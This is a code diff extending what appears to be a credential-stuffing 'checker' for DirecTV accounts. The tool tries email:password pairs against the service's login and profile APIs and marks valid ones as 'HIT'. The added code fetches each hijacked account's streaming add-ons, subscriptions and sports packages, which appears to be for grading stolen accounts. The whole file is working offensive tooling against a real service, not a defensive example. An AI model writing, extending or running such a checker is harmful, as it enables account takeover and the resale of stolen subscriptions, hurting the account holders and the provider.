@@ -21,6 +21,9 @@ IDENTITY_BASE = "https://identity.directv.com"
 TOKEN_URL = "https://api.cld.dtvce.com/authn-tokengo/v3"
 ACCOUNT_INFO_URL = "https://api.cld.dtvce.com/profile/information/basicinfogo/service"
 CHANNELS_URL = "https://api.cld.dtvce.com/discovery/metadata/channel/v5/service/allchannels"
+SVOD_PROVIDERS_URL = "https://api.cld.dtvce.com/discovery/edge/svodprovider/v1/service/providers"
+SUBSCRIPTIONS_URL = "https://api.cld.dtvce.com/account/purchase/gateway/v2/account/subscriptions"
+SALES_CHANNEL = "ffp-apple"
 
 CLIENT_ID = "UNIFIED_iOS_Mobile"
 FR_CLIENT_ID = "fr_iOS_mobile_02"
@@ -31,6 +34,69 @@ USER_AGENT = (
 )
 
 ACTIVE_STATUSES = {"ACTV", "ACTIVE", "A"}
+
+PACKAGE_ADDON_KEYWORDS = {
+    "peacock": "Peacock",
+    "netflix": "Netflix",
+    "hulu": "Hulu",
+    "disney": "Disney+",
+    "max": "Max",
+    "hbo": "HBO",
+    "showtime": "Showtime",
+    "starz": "Starz",
+    "cinemax": "Cinemax",
+    "espn": "ESPN",
+    "paramount": "Paramount+",
+    "discovery": "Discovery+",
+    "amc": "AMC+",
+    "sports": "Sports",
+    "protection plan": "Protection Plan",
+    "nfl": "NFL",
+    "mlb": "MLB",
+    "nba": "NBA",
+    "nhl": "NHL",
+    "sunday ticket": "NFL Sunday Ticket",
+    "extra innings": "MLB Extra Innings",
+    "league pass": "League Pass",
+}
+
+SPORTS_REGION_MARKERS = {
+    "BIG10HD": "Big Ten",
+    "BTN2OF": "Big Ten",
+    "BTN3OF": "Big Ten",
+    "BTN4OF": "Big Ten",
+    "BG10O2H": "Big Ten",
+    "BGTN3HD": "Big Ten",
+    "BGTN4HD": "Big Ten",
+    "MLB": "MLB",
+    "NFL": "NFL",
+    "NBA": "NBA",
+    "NHL": "NHL",
+    "SUNDAY TICKET": "NFL Sunday Ticket",
+    "EXTRA INNINGS": "MLB Extra Innings",
+    "LEAGUE PASS": "League Pass",
+    "SEC": "SEC Network",
+    "GOLF": "Golf",
+    "TENNIS": "Tennis",
+    "SOCCER": "Soccer",
+    "FIGHT": "Fight Network",
+    "RSN": "Regional Sports",
+}
+
+SPORTS_CHANNEL_PATTERNS = [
+    (re.compile(r"mlb extra innings", re.I), "MLB Extra Innings"),
+    (re.compile(r"nfl sunday ticket", re.I), "NFL Sunday Ticket"),
+    (re.compile(r"nba league pass", re.I), "NBA League Pass"),
+    (re.compile(r"nhl center ice", re.I), "NHL Center Ice"),
+    (re.compile(r"espn\+", re.I), "ESPN+"),
+    (re.compile(r"sec network", re.I), "SEC Network"),
+    (re.compile(r"big ten", re.I), "Big Ten"),
+    (re.compile(r"peacock", re.I), "Peacock"),
+    (re.compile(r"showtime", re.I), "Showtime"),
+    (re.compile(r"starz", re.I), "Starz"),
+    (re.compile(r"cinemax", re.I), "Cinemax"),
+    (re.compile(r"\bhbo\b", re.I), "HBO"),
+]
 
 
 @dataclass
@@ -44,6 +110,9 @@ class CheckResult:
     package: str | None = None
     first_name: str | None = None
     channels: int | None = None
+    svod_addons: list[str] | None = None
+    sports_packages: list[str] | None = None
+    addons: list[str] | None = None
     error: str | None = None
 
     def format_line(self) -> str:
@@ -57,6 +126,14 @@ class CheckResult:
                 extras.append(f"name={self.first_name}")
             if self.channels is not None:
                 extras.append(f"channels={self.channels}")
+            if self.svod_addons:
+                extras.append(f"streaming={', '.join(self.svod_addons)}")
+            elif self.svod_addons is not None:
+                extras.append("streaming=none")
+            if self.sports_packages:
+                extras.append(f"sports={', '.join(self.sports_packages)}")
+            if self.addons:
+                extras.append(f"addons={', '.join(self.addons)}")
             extra = f" | {' | '.join(extras)}" if extras else ""
             return (
                 f"{self.email}:{self.password} | HIT | Active: {active_label} | "
@@ -156,7 +233,9 @@ class DTVChecker:
                 }
 
                 info = self._get_account_info(client, api_headers)
-                channels = self._get_channel_count(client, api_headers)
+                channel_data = self._get_channel_data(client, api_headers)
+                channels = channel_data.get("size")
+                channel_names = channel_data.get("channel_names", [])
 
                 account_status = info.get("accountStatus")
                 package = (
@@ -170,6 +249,16 @@ class DTVChecker:
                     else None
                 )
 
+                svod_addons = self._get_svod_addons(client, api_headers)
+                stream_addons = self._get_stream_subscriptions(client, api_headers, email)
+                package_addons = self._extract_package_addons(package)
+                sports_packages = self._detect_sports_packages(
+                    package,
+                    channel_data.get("aggregated_location_ids", ""),
+                    channel_names,
+                )
+                addons = self._merge_addons(stream_addons, package_addons, sports_packages, svod_addons)
+
                 return CheckResult(
                     email=email,
                     password=password,
@@ -179,7 +268,10 @@ class DTVChecker:
                     account_type=info.get("accountType") or value_pairs.get("accountType"),
                     package=package,
                     first_name=value_pairs.get("firstName"),
-                    channels=channels,
+                    channels=int(channels) if channels is not None else None,
+                    svod_addons=svod_addons,
+                    sports_packages=sports_packages,
+                    addons=addons,
                 )
         except httpx.HTTPError as exc:
             return CheckResult(email, password, "ERROR", error=str(exc))
@@ -308,13 +400,107 @@ class DTVChecker:
             return {}
         return self._json_or_error(response)
 
-    def _get_channel_count(self, client: httpx.Client, headers: dict[str, str]) -> int | None:
+    def _get_channel_data(self, client: httpx.Client, headers: dict[str, str]) -> dict[str, Any]:
         response = client.get(CHANNELS_URL, headers=headers)
         if response.status_code != 200:
-            return None
+            return {}
         data = self._json_or_error(response)
-        size = data.get("size")
-        return int(size) if size is not None else None
+        channel_names = [
+            channel.get("channelName", "")
+            for channel in data.get("channelInfoList", [])
+            if channel.get("channelName")
+        ]
+        return {
+            "size": data.get("size"),
+            "aggregated_location_ids": data.get("aggregatedLocationIds", ""),
+            "channel_names": channel_names,
+        }
+
+    def _get_svod_addons(self, client: httpx.Client, headers: dict[str, str]) -> list[str]:
+        response = client.get(SVOD_PROVIDERS_URL, headers=headers)
+        if response.status_code != 200:
+            return []
+        data = self._json_or_error(response)
+        addons = []
+        for provider in data.get("svodProvider", []):
+            if provider.get("subscription"):
+                title = provider.get("title")
+                if title:
+                    addons.append(title)
+        return sorted(set(addons))
+
+    def _get_stream_subscriptions(
+        self,
+        client: httpx.Client,
+        headers: dict[str, str],
+        email: str,
+    ) -> list[str]:
+        response = client.post(
+            SUBSCRIPTIONS_URL,
+            headers=headers,
+            json={"salesChannel": SALES_CHANNEL, "accessId": email},
+        )
+        if response.status_code != 200:
+            return []
+        data = self._json_or_error(response)
+        addons = []
+        for product in data.get("products", []):
+            status = str(product.get("status", "")).upper()
+            if status not in {"ACTIVE", "ACTV", "SUBSCRIBED"}:
+                continue
+            name = (
+                product.get("displayName")
+                or product.get("tierDisplayName")
+                or product.get("billingProductCode")
+                or product.get("package")
+            )
+            if name:
+                addons.append(str(name))
+        return sorted(set(addons))
+
+    @staticmethod
+    def _extract_package_addons(package: str | None) -> list[str]:
+        if not package:
+            return []
+        normalized = package.replace("_", " ").lower()
+        found = []
+        for keyword, label in PACKAGE_ADDON_KEYWORDS.items():
+            if keyword in normalized:
+                found.append(label)
+        return sorted(set(found))
+
+    @staticmethod
+    def _detect_sports_packages(
+        package: str | None,
+        region_blob: str,
+        channel_names: list[str],
+    ) -> list[str]:
+        found: list[str] = []
+        search_space = f"{package or ''} {region_blob}".upper()
+        for marker, label in SPORTS_REGION_MARKERS.items():
+            if marker in search_space:
+                found.append(label)
+
+        for channel_name in channel_names:
+            for pattern, label in SPORTS_CHANNEL_PATTERNS:
+                if pattern.search(channel_name):
+                    found.append(label)
+
+        return sorted(set(found))
+
+    @staticmethod
+    def _merge_addons(
+        stream_addons: list[str],
+        package_addons: list[str],
+        sports_packages: list[str],
+        svod_addons: list[str],
+    ) -> list[str]:
+        merged = []
+        for group in (stream_addons, svod_addons, sports_packages, package_addons):
+            for item in group:
+                if item and item not in merged:
+                    merged.append(item)
+        return merged
 
     @staticmethod
     def _json_or_error(response: httpx.Response) -> dict[str, Any]:
@@ -388,6 +574,9 @@ def main(argv: list[str] | None = None) -> int:
                         "package": result.package,
                         "first_name": result.first_name,
                         "channels": result.channels,
+                        "svod_addons": result.svod_addons,
+                        "sports_packages": result.sports_packages,
+                        "addons": result.addons,
                         "error": result.error,
                     },
                     indent=2,
